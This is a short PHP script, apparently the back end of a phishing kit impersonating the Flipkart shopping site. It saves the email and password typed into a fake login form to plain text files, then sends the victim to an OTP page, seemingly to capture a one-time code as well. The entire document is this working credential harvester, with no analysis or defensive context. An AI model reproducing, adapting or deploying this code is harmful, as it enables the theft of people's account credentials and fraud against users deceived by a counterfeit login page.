<?php

file_put_contents("usernames.txt", "Flipcart Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Flipcart Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
